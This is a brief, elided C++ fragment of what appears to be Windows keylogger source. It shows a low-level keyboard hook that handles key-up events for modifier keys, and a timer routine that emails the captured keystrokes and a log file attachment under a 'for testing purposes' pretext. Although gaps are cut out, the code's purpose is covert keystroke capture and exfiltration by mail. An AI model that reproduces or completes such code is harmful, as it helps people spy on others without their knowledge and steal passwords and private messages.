...
void TimerSendMail()
{
    ...
    int x = Mail::SendMail("Log [" + last_file + "]", "Hi \n The file has been attached to this mail for testing purposes " + keylog, IO::GetOurPath(true) + last_file);
    if (x!=7)
...
LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
{
    ...
    else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
    {
        ...
        if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT || key == VK_MENU || key == VK_LMENU || key == VK_CAPITAL || key == VK_RMENU || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN)
        {
